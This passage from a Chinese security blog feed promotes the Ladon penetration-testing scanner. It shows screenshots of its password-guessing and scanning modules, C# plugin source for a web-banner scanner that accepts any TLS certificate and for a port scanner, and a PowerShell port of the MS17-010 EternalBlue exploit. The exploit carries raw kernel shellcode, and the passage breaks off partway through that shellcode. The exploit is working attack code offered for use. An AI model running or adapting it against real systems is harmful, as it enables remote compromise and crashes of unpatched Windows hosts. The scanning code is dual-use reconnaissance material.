<h3 id="主机名解析IP"><a href="#主机名解析IP" class="headerlink" title="主机名解析IP"></a>主机名解析IP</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/kali/Kali_HostIP.gif"></p>
<h3 id="子域名解析IP"><a href="#子域名解析IP" class="headerlink" title="子域名解析IP"></a>子域名解析IP</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/kali/Kali_DomainIP.gif"></p>
<h3 id="SSH口令检测"><a href="#SSH口令检测" class="headerlink" title="SSH口令检测"></a>SSH口令检测</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/kali/Kali_SshScan.gif"></p>
<h3 id="加载PowerShell插件"><a href="#加载PowerShell插件" class="headerlink" title="加载PowerShell插件"></a>加载PowerShell插件</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/kali/kali_ps1.PNG"></p>
<h3 id="PhpStudy后门扫描"><a href="#PhpStudy后门扫描" class="headerlink" title="PhpStudy后门扫描"></a>PhpStudy后门扫描</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/kali/kali_PhpStudyPoc.gif"></p>
<h3 id="URL域名扫描（不验IP）"><a href="#URL域名扫描（不验IP）" class="headerlink" title="URL域名扫描（不验IP）"></a>URL域名扫描（不验IP）</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/kali/kali_UrlScan.gif"></p>
<h3 id="站点域名扫描（验证IP）"><a href="#站点域名扫描（验证IP）" class="headerlink" title="站点域名扫描（验证IP）"></a>站点域名扫描（验证IP）</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/kali/kali_SameWeb.gif"></p>
<h3 id="Web信息扫描"><a href="#Web信息扫描" class="headerlink" title="Web信息扫描"></a>Web信息扫描</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/kali/kali_WebScan.gif"></p>
<h3 id="Web目录扫描"><a href="#Web目录扫描" class="headerlink" title="Web目录扫描"></a>Web目录扫描</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/kali/kali_WebDir.gif"></p>
<h3 id="Mysql口令检测"><a href="#Mysql口令检测" class="headerlink" title="Mysql口令检测"></a>Mysql口令检测</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/kali/kali_MysqlScan.gif"></p>
<h3 id="Oracle口令检测"><a href="#Oracle口令检测" class="headerlink" title="Oracle口令检测"></a>Oracle口令检测</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/kali/kali_OracleScan.gif"></p>
<h3 id="Vnc口令检测"><a href="#Vnc口令检测" class="headerlink" title="Vnc口令检测"></a>Vnc口令检测</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/kali/kali_VncScan.gif"></p>
<h3 id="Http-Ftp下载"><a href="#Http-Ftp下载" class="headerlink" title="Http/Ftp下载"></a>Http/Ftp下载</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/kali/kali_Http_Ftp_Download.PNG"></p>
<h3 id="Base64密码加解密"><a href="#Base64密码加解密" class="headerlink" title="Base64密码加解密"></a>Base64密码加解密</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/kali/Kali_Base64.gif"></p>
<h3 id="Hex密码加解密"><a href="#Hex密码加解密" class="headerlink" title="Hex密码加解密"></a>Hex密码加解密</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/kali/Kali_Hex.gif"></p>
<h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><table>
<thead>
<tr>
<th>ID</th>
<th>主题</th>
<th>URL</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>Ladon文档主页</td>
<td><a href="https://github.com/k8gege/Ladon/wiki" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki</a></td>
</tr>
<tr>
<td>2</td>
<td>基础用法详解</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/Ladon-Usage" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-Usage</a></td>
</tr>
<tr>
<td>3</td>
<td>Cobalt Strike</td>
<td><a href="https://github.com/k8gege/Aggressor" target="_blank" rel="noopener">https://github.com/k8gege/Aggressor</a></td>
</tr>
<tr>
<td>4</td>
<td>Exp生成器使用</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/LadonExp-Usage" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/LadonExp-Usage</a></td>
</tr>
<tr>
<td>5</td>
<td>高度自定义插件</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle</a></td>
</tr>
<tr>
<td>6</td>
<td>外部模块参考</td>
<td><a href="https://github.com/k8gege/K8CScan/wiki" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/wiki</a></td>
</tr>
<tr>
<td>7</td>
<td>PowerLadon</td>
<td><a href="https://github.com/k8gege/powerladon" target="_blank" rel="noopener">https://github.com/k8gege/powerladon</a></td>
</tr>
<tr>
<td>8</td>
<td>PythonLadon</td>
<td><a href="https://github.com/k8gege/PyLadon" target="_blank" rel="noopener">https://github.com/k8gege/PyLadon</a></td>
</tr>
<tr>
<td>9</td>
<td>KaliLadon</td>
<td><a href="https://github.com/k8gege/KaliLadon" target="_blank" rel="noopener">https://github.com/k8gege/KaliLadon</a></td>
</tr>
<tr>
<td>10</td>
<td>漏洞演示视频</td>
<td><a href="https://github.com/k8gege/K8CScan/tree/master/Video" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/tree/master/Video</a></td>
</tr>
</tbody></table>
<h3 id="源码编译"><a href="#源码编译" class="headerlink" title="源码编译"></a>源码编译</h3><p>git clone <a href="https://github.com/k8gege/Ladon.git" target="_blank" rel="noopener">https://github.com/k8gege/Ladon.git</a><br><br>使用VS2012或以上版本分别编译.net 3.5、4.0版本EXE<br></p>
<h3 id="成品下载"><a href="#成品下载" class="headerlink" title="成品下载"></a>成品下载</h3><p><a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br><br>Win7/2008或安装.net 2.x 3.x系统可使用Ladon.exe<br><br>Win8-win10或安装.net 4.x系统可使用Ladon40.exe<br></p>
]]></content>
      <categories>
        <category>工具</category>
        <category>Ladon</category>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
        <tag>Tool</tag>
        <tag>Kali</tag>
        <tag>Scanner</tag>
      </tags>
  </entry>
  <entry>
    <title>Ladon插件实例内网Web扫描C#源码</title>
    <url>/p/da863d02.html</url>
    <content><![CDATA[<p><img alt="PortScan" data-original="http://k8gege.org/k8img/Ladon/moudle/webscan.PNG"></p>
<p>获取网页标题、服务器Banner，例子仅探测80端口<br>大家可自行修改添加其它端口识别定制Web扫描功能<br>如识别出特定中间件或WEB后再检测是否存在漏洞等<br>编译后的netscan.dll可改成任意名称Ladon均可加载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Net;</span><br><span class="line">using System.Text.RegularExpressions;</span><br><span class="line"></span><br><span class="line">namespace LadonDLL</span><br><span class="line">&#123;</span><br><span class="line">    public class scan</span><br><span class="line">    &#123;</span><br><span class="line">        public static string run(string ip)</span><br><span class="line">        &#123;</span><br><span class="line">            if (string.IsNullOrEmpty(ip))</span><br><span class="line">                return &quot;&quot;;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                &#x2F;&#x2F;192.11.22.10    Microsoft-IIS&#x2F;10.0      IIS Windows</span><br><span class="line">                &#x2F;&#x2F;192.11.22.1     H3C-Miniware-Webs       ER3200G2系统管理</span><br><span class="line">                return ip + &quot;\t&quot; + getURLbanner(ip) + &quot;\t&quot; + GetTitle(getHtml(&quot;http:&#x2F;&#x2F;&quot; + ip,2));</span><br><span class="line">            </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static string getURLbanner(string url)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F;&#x2F;&#x2F;HttpWebResponse res;</span><br><span class="line">            if (!url.ToLower().Contains(&quot;https:&#x2F;&#x2F;&quot;) &amp;&amp; !url.ToLower().Contains(&quot;http:&#x2F;&#x2F;&quot;))</span><br><span class="line">                url &#x3D; &quot;http:&#x2F;&#x2F;&quot; + url;</span><br><span class="line"></span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                var req &#x3D; (HttpWebRequest)WebRequest.CreateDefault(new Uri(url));</span><br><span class="line">                req.Method &#x3D; &quot;HEAD&quot;;</span><br><span class="line">                req.Timeout &#x3D; 1000;</span><br><span class="line">                var res &#x3D; (HttpWebResponse)req.GetResponse();</span><br><span class="line"></span><br><span class="line">                if (res.StatusCode &#x3D;&#x3D; HttpStatusCode.OK || res.StatusCode &#x3D;&#x3D; HttpStatusCode.Forbidden || res.StatusCode &#x3D;&#x3D; HttpStatusCode.Redirect || res.StatusCode &#x3D;&#x3D; HttpStatusCode.MovedPermanently)</span><br><span class="line">                &#123;</span><br><span class="line">                    return res.Server;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                &#x2F;&#x2F;res.Close();</span><br><span class="line"></span><br><span class="line">                return res.Server;</span><br><span class="line">            &#125;</span><br><span class="line">            catch (WebException ex)</span><br><span class="line">            &#123;</span><br><span class="line">                return &quot;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static string GetTitle(string html)</span><br><span class="line">        &#123;</span><br><span class="line">            if (html.Contains(&quot;&lt;hTmlKErRor&gt;&quot;))</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F;return html.Replace(&quot;&lt;hTmlKErRor&gt;&quot;, &quot;&quot;);</span><br><span class="line">                return &quot;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            html &#x3D; html.Replace(&quot;&lt;br&gt;&quot;, &quot;&quot;);</span><br><span class="line">            html &#x3D; html.Replace(&quot;&lt;BR&gt;&quot;, &quot;&quot;);</span><br><span class="line">            html &#x3D; html.Replace(&quot;\r\n&quot;, &quot;&quot;);</span><br><span class="line">            html &#x3D; html.Replace(&quot;&amp;nbsp;&quot;, &quot; &quot;);</span><br><span class="line">            html &#x3D; html.Replace(&quot;\n&quot;, &quot;&quot;).Trim();</span><br><span class="line"></span><br><span class="line">            String regex &#x3D; @&quot;&lt;title.+&lt;&#x2F;title&gt;&quot;;</span><br><span class="line"></span><br><span class="line">            String title &#x3D; Regex.Match(html, regex).ToString();</span><br><span class="line">            title &#x3D; Regex.Replace(title, @&quot;[\&quot;&quot;]+&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">            title &#x3D; title.TrimStart(&#39;&lt;&#39;);</span><br><span class="line"></span><br><span class="line">            string regex2 &#x3D; @&quot;&gt;.+&lt;&#x2F;title&gt;&quot;;</span><br><span class="line"></span><br><span class="line">            string title2 &#x3D; Regex.Match(title, regex2).ToString();</span><br><span class="line">            title2 &#x3D; title2.TrimStart(&#39;&gt;&#39;).Replace(&quot;&lt;&#x2F;title&gt;&quot;, &quot;&quot;).Trim();</span><br><span class="line"></span><br><span class="line">            if (title2.Length &gt; 50)</span><br><span class="line">                return title2.Substring(0, 50);</span><br><span class="line"></span><br><span class="line">            return title2;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static string getHtml(string url, int codingType)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                if (!url.ToLower().Contains(&quot;https:&#x2F;&#x2F;&quot;) &amp;&amp; !url.ToLower().Contains(&quot;http:&#x2F;&#x2F;&quot;))</span><br><span class="line">                    url &#x3D; &quot;http:&#x2F;&#x2F;&quot; + url;</span><br><span class="line">                WebClient myWebClient &#x3D; new WebClient();</span><br><span class="line">                if (url.ToLower().Contains(&quot;https:&#x2F;&#x2F;&quot;))</span><br><span class="line">                &#123;</span><br><span class="line">                    System.Net.ServicePointManager.ServerCertificateValidationCallback +&#x3D;</span><br><span class="line">    delegate(object sender, System.Security.Cryptography.X509Certificates.X509Certificate certificate,</span><br><span class="line">             System.Security.Cryptography.X509Certificates.X509Chain chain,</span><br><span class="line">             System.Net.Security.SslPolicyErrors sslPolicyErrors)</span><br><span class="line">    &#123;</span><br><span class="line">        return true; &#x2F;&#x2F; **** Always accept</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                byte[] myDataBuffer &#x3D; myWebClient.DownloadData(url);</span><br><span class="line">                &#x2F;&#x2F;return Encoding.Default.GetString(myDataBuffer);</span><br><span class="line">                string strWebData &#x3D; System.Text.Encoding.Default.GetString(myDataBuffer);</span><br><span class="line"></span><br><span class="line">                &#x2F;&#x2F;自动识别编码  不一定有&lt;meta  比如 百度开放平台 content&#x3D;&quot;text&#x2F;html; charset&#x3D;gbk&quot;&gt;</span><br><span class="line">                &#x2F;&#x2F;Match charSetMatch &#x3D; Regex.Match(strWebData, &quot;&lt;meta([^&gt;]*)charset&#x3D;(\&quot;)?(.*)?\&quot;&quot;, RegexOptions.IgnoreCase | RegexOptions.Multiline);</span><br><span class="line">                Match charSetMatch &#x3D; Regex.Match(strWebData, &quot;(.*)charset&#x3D;(\&quot;)?(.*)?\&quot;&quot;, RegexOptions.IgnoreCase | RegexOptions.Multiline);</span><br><span class="line"></span><br><span class="line">                string webCharSet &#x3D; charSetMatch.Groups[3].Value.Trim().ToLower();</span><br><span class="line"></span><br><span class="line">                if (webCharSet !&#x3D; &quot;gb2312&quot; &amp;&amp; webCharSet !&#x3D; &quot;gbk&quot;)</span><br><span class="line">                &#123;</span><br><span class="line">                    webCharSet &#x3D; &quot;utf-8&quot;;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (System.Text.Encoding.GetEncoding(webCharSet) !&#x3D; System.Text.Encoding.Default)</span><br><span class="line">                &#123;</span><br><span class="line">                    strWebData &#x3D; System.Text.Encoding.GetEncoding(webCharSet).GetString(myDataBuffer);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                &#x2F;&#x2F;if (codingType &#x3D;&#x3D; 1)</span><br><span class="line">                &#x2F;&#x2F;    return Encoding.Unicode.GetString(myDataBuffer);</span><br><span class="line">                &#x2F;&#x2F;else if (codingType &#x3D;&#x3D; 2)</span><br><span class="line">                &#x2F;&#x2F;    return Encoding.Default.GetString(myDataBuffer);&#x2F;&#x2F;GBK 936</span><br><span class="line">                &#x2F;&#x2F;else if (codingType &#x3D;&#x3D; 3)</span><br><span class="line">                &#x2F;&#x2F;    return Encoding.UTF8.GetString(myDataBuffer);&#x2F;&#x2F;65501</span><br><span class="line"></span><br><span class="line">                return strWebData;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F;Console.WriteLine(url + &quot; &quot; + ex.Message);</span><br><span class="line">                return &quot;&lt;hTmlKErRor&gt;&quot; + ex.Message;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Ladon</category>
        <category>.NET</category>
        <category>主机发现</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
        <tag>Code</tag>
        <tag>Moudle</tag>
        <tag>WebScan</tag>
        <tag>C#</tag>
      </tags>
  </entry>
  <entry>
    <title>Ladon插件实例简单端口扫描C#源码</title>
    <url>/p/4a713e0e.html</url>
    <content><![CDATA[<p><img alt="PortScan" data-original="http://k8gege.org/k8img/Ladon/moudle/portscan.PNG"></p>
<p>源码为单纯检测端口是否开放，有需要大家可自行定制功能。<br>当然可以使用PortScan模块扫描开放端口带服务和Web识别。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Net;</span><br><span class="line">using System.Text.RegularExpressions;</span><br><span class="line">using System.Net.Sockets;</span><br><span class="line">&#x2F;&#x2F;Ladon PortScan Moudle</span><br><span class="line">namespace LadonDLL</span><br><span class="line">&#123;</span><br><span class="line">    public class scan</span><br><span class="line">    &#123;</span><br><span class="line">        public static string run(string ip)</span><br><span class="line">        &#123;</span><br><span class="line">            if (string.IsNullOrEmpty(ip))</span><br><span class="line">                return &quot;&quot;;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                if (K8CheckPort(ip, 21))</span><br><span class="line">                    Console.Write(ip + &quot;\t21 Open\r\n&quot;);</span><br><span class="line">                if (K8CheckPort(ip, 80))</span><br><span class="line">                    Console.Write(ip + &quot;\t80 Open\r\n&quot;);</span><br><span class="line">                if (K8CheckPort(ip, 1433))</span><br><span class="line">                    Console.Write(ip + &quot;\t1433 Open\r\n&quot;);</span><br><span class="line">                if (K8CheckPort(ip, 3306))</span><br><span class="line">                    Console.Write(ip + &quot;\t3306 Open\r\n&quot;);</span><br><span class="line">                if (K8CheckPort(ip, 1521))</span><br><span class="line">                    Console.Write(ip + &quot;\t1521 Open\r\n&quot;);</span><br><span class="line">                if (K8CheckPort(ip, 3389))</span><br><span class="line">                    Console.Write(ip + &quot;\t3389 Open\r\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static bool K8CheckPort(string ip, int Port)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F;int Port &#x3D; 21;</span><br><span class="line">            IPAddress scanip &#x3D; IPAddress.Parse(ip);</span><br><span class="line">            IPEndPoint point &#x3D; new IPEndPoint(scanip, Port);</span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                TcpClient tcp &#x3D; new TcpClient();</span><br><span class="line">                tcp.Connect(point);</span><br><span class="line">                &#x2F;&#x2F;Console.WriteLine(scanip + &quot;\t&quot; + Port + &quot;\tOpen&quot;);</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F;Console.WriteLine(scanip + &quot;\t&quot; + Port + &quot;\tClose&quot;);</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>工具</category>
        <category>Ladon</category>
        <category>.NET</category>
        <category>源码</category>
        <category>编程</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
        <tag>Code</tag>
        <tag>Moudle</tag>
        <tag>PortScan</tag>
        <tag>Sharp</tag>
      </tags>
  </entry>
  <entry>
    <title>Ladon MS17010 Exploit for PowerShell</title>
    <url>/p/89f3c60.html</url>
    <content><![CDATA[<h3 id="Win-Ladon"><a href="#Win-Ladon" class="headerlink" title="Win Ladon"></a>Win Ladon</h3><p><img alt="MS17010EXP" data-original="https://k8gege.github.io/k8img/Ladon/exp/MS17010EXP.png"></p>
<h3 id="Kali-PowerShell"><a href="#Kali-PowerShell" class="headerlink" title="Kali PowerShell"></a>Kali PowerShell</h3><p><img alt="Kali-MS17010EXP" data-original="https://raw.githubusercontent.com/k8gege/MS17010EXP/master/Kali_psexp1.PNG"></p>
<h3 id="MS17010EXP"><a href="#MS17010EXP" class="headerlink" title="MS17010EXP"></a>MS17010EXP</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Ladon Moudle MS17010 EXPLOIT</span></span><br><span class="line"><span class="comment">#Using Invoke-EternalBlue.ps1</span></span><br><span class="line"><span class="comment">#Author k8gege</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ladon</span> <span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">param</span>([<span class="built_in">string</span>]<span class="variable">$ip</span>) </span><br><span class="line"><span class="comment">#write-output $ip</span></span><br><span class="line"><span class="variable">$result</span>=<span class="operator">-Join</span>(<span class="string">"MS17010EXP "</span>,<span class="variable">$ip</span>)</span><br><span class="line"><span class="built_in">Invoke-EternalBlue</span> <span class="variable">$ip</span> <span class="number">12</span> <span class="number">5</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$result</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#replace your shellcode (default is blue screen)</span></span><br><span class="line">[<span class="built_in">Byte</span>[]] <span class="variable">$Shellcode</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x20,<span class="number">0</span>x49,<span class="number">0</span>x01,<span class="number">0</span>xD0,<span class="number">0</span>xE3,<span class="number">0</span>x56,<span class="number">0</span>x48,<span class="number">0</span>xFF,<span class="number">0</span>xC9,<span class="number">0</span>x41,<span class="number">0</span>x8B,<span class="number">0</span>x34,<span class="number">0</span>x88,<span class="number">0</span>x48,<span class="number">0</span>x01,<span class="number">0</span>xD6,<span class="number">0</span>x4D,<span class="number">0</span>x31,<span class="number">0</span>xC9,<span class="number">0</span>x48,<span class="number">0</span>x31,<span class="number">0</span>xC0,<span class="number">0</span>xAC,<span class="number">0</span>x41,<span class="number">0</span>xC1,<span class="number">0</span>xC9,<span class="number">0</span>x0D,<span class="number">0</span>x41,<span class="number">0</span>x01,<span class="number">0</span>xC1,<span class="number">0</span>x38,<span class="number">0</span>xE0,<span class="number">0</span>x75,<span class="number">0</span>xF1,<span class="number">0</span>x4C,<span class="number">0</span>x03,<span class="number">0</span>x4C,<span class="number">0</span>x24,<span class="number">0</span>x08,<span class="number">0</span>x45,<span class="number">0</span>x39,<span class="number">0</span>xD1,<span class="number">0</span>x75,<span class="number">0</span>xD8,<span class="number">0</span>x58,<span class="number">0</span>x44,<span class="number">0</span>x8B,<span class="number">0</span>x40,<span class="number">0</span>x24,<span class="number">0</span>x49)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Invoke-EternalBlue</span><span class="params">(<span class="variable">$Target</span>, <span class="variable">$InitialGrooms</span>, <span class="variable">$MaxAttempts</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">write-output</span> <span class="variable">$Target</span></span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment">    <span class="doctag">.SYNOPSIS</span></span></span><br><span class="line"><span class="comment">        PowerShell port of MS17_010 Metasploit module</span></span><br><span class="line"><span class="comment">        Based on Eternal Blue metasploit module by Sean Dillon &lt;sean.dillon@risksense.com&gt;',  </span></span><br><span class="line"><span class="comment">        # @zerosum0x0 'Dylan Davis &lt;dylan.davis@risksense.com&gt;',  </span></span><br><span class="line"><span class="comment">        # @jennamagius</span></span><br><span class="line"><span class="comment">        </span></span><br><span class="line"><span class="comment">    <span class="doctag">.PARAMETER Target.</span></span></span><br><span class="line"><span class="comment">        Host to exploit</span></span><br><span class="line"><span class="comment">    <span class="doctag">.PARAMETER InitialGrooms</span></span></span><br><span class="line"><span class="comment">        Initial Grooms.</span></span><br><span class="line"><span class="comment">    <span class="doctag">.PARAMETER MaxAttempts</span></span></span><br><span class="line"><span class="comment">        number of times to run exploit</span></span><br><span class="line"><span class="comment">    <span class="doctag">.PARAMETER ShellCode</span></span></span><br><span class="line"><span class="comment">        ShellCode to execute on exploit</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    <span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment">        Invoke-EternalBlue -Target 127.0.0.1  -InitialGrooms 12 -MaxAttempts 12 -Shellcode @(0x90,0x90,0xC3)</span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$enc</span> = [<span class="type">system.Text.Encoding</span>]::ASCII</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$GROOM_DELTA</span> = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_kernel_shellcode</span></span> &#123;</span><br><span class="line">    [<span class="built_in">Byte</span>[]] <span class="variable">$shellcode</span> =<span class="selector-tag">@</span>(<span class="number">0</span>xB9,<span class="number">0</span>x82,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>xC0,<span class="number">0</span>x0F,<span class="number">0</span>x32,<span class="number">0</span>x48,<span class="number">0</span>xBB,<span class="number">0</span>xF8,<span class="number">0</span>x0F,<span class="number">0</span>xD0,<span class="number">0</span>xFF,<span class="number">0</span>xFF,<span class="number">0</span>xFF,<span class="number">0</span>xFF,</span><br><span class="line"><span class="number">0</span>xFF,<span class="number">0</span>x89,<span class="number">0</span>x53,<span class="number">0</span>x04,<span class="number">0</span>x89,<span class="number">0</span>x03,<span class="number">0</span>x48,<span class="number">0</span>x8D,<span class="number">0</span>x05,<span class="number">0</span>x0A,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x48,<span class="number">0</span>x89,<span class="number">0</span>xC2,</span><br><span class="line"><span class="number">0</span>x48,<span class="number">0</span>xC1,<span class="number">0</span>xEA,<span class="number">0</span>x20,<span class="number">0</span>x0F,<span class="number">0</span>x30,<span class="number">0</span>xC3,<span class="number">0</span>x0F,<span class="number">0</span>x01,<span class="number">0</span>xF8,<span class="number">0</span>x65,<span class="number">0</span>x48,<span class="number">0</span>x89,<span class="number">0</span>x24,<span class="number">0</span>x25,<span class="number">0</span>x10,</span><br><span class="line"><span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x65,<span class="number">0</span>x48,<span class="number">0</span>x8B,<span class="number">0</span>x24,<span class="number">0</span>x25,<span class="number">0</span>xA8,<span class="number">0</span>x01,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x50,<span class="number">0</span>x53,<span class="number">0</span>x51,<span class="number">0</span>x52,</span><br><span class="line"><span class="number">0</span>x56,<span class="number">0</span>x57,<span class="number">0</span>x55,<span class="number">0</span>x41,<span class="number">0</span>x50,<span class="number">0</span>x41,<span class="number">0</span>x51,<span class="number">0</span>x41,<span class="number">0</span>x52,<span class="number">0</span>x41,<span class="number">0</span>x53,<span class="number">0</span>x41,<span class="number">0</span>x54,<span class="number">0</span>x41,<span class="number">0</span>x55,<span class="number">0</span>x41,</span><br><span class="line"><span class="number">0</span>x56,<span class="number">0</span>x41,<span class="number">0</span>x57,<span class="number">0</span>x6A,<span class="number">0</span>x2B,<span class="number">0</span>x65,<span class="number">0</span>xFF,<span class="number">0</span>x34,<span class="number">0</span>x25,<span class="number">0</span>x10,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x41,<span class="number">0</span>x53,<span class="number">0</span>x6A,</span><br><span class="line"><span class="number">0</span>x33,<span class="number">0</span>x51,<span class="number">0</span>x4C,<span class="number">0</span>x89,<span class="number">0</span>xD1,<span class="number">0</span>x48,<span class="number">0</span>x83,<span class="number">0</span>xEC,<span class="number">0</span>x08,<span class="number">0</span>x55,<span class="number">0</span>x48,<span class="number">0</span>x81,<span class="number">0</span>xEC,<span class="number">0</span>x58,<span class="number">0</span>x01,<span class="number">0</span>x00,</span><br><span class="line"><span class="number">0</span>x00,<span class="number">0</span>x48,<span class="number">0</span>x8D,<span class="number">0</span>xAC,<span class="number">0</span>x24,<span class="number">0</span>x80,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x48,<span class="number">0</span>x89,<span class="number">0</span>x9D,<span class="number">0</span>xC0,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,</span><br><span class="line"><span class="number">0</span>x48,<span class="number">0</span>x89,<span class="number">0</span>xBD,<span class="number">0</span>xC8,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x48,<span class="number">0</span>x89,<span class="number">0</span>xB5,<span class="number">0</span>xD0,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x48,<span class="number">0</span>xA1,</span><br><span class="line"><span class="number">0</span>xF8,<span class="number">0</span>x0F,<span class="number">0</span>xD0,<span class="number">0</span>xFF,<span class="number">0</span>xFF,<span class="number">0</span>xFF,<span class="number">0</span>xFF,<span class="number">0</span>xFF,<span class="number">0</span>x48,<span class="number">0</span>x89,<span class="number">0</span>xC2,<span class="number">0</span>x48,<span class="number">0</span>xC1,<span class="number">0</span>xEA,<span class="number">0</span>x20,<span class="number">0</span>x48,</span><br><span class="line"><span class="number">0</span>x31,<span class="number">0</span>xDB,<span class="number">0</span>xFF,<span class="number">0</span>xCB,<span class="number">0</span>x48,<span class="number">0</span>x21,<span class="number">0</span>xD8,<span class="number">0</span>xB9,<span class="number">0</span>x82,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>xC0,<span class="number">0</span>x0F,<span class="number">0</span>x30,<span class="number">0</span>xFB,<span class="number">0</span>xE8,</span><br><span class="line"><span class="number">0</span>x38,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>xFA,<span class="number">0</span>x65,<span class="number">0</span>x48,<span class="number">0</span>x8B,<span class="number">0</span>x24,<span class="number">0</span>x25,<span class="number">0</span>xA8,<span 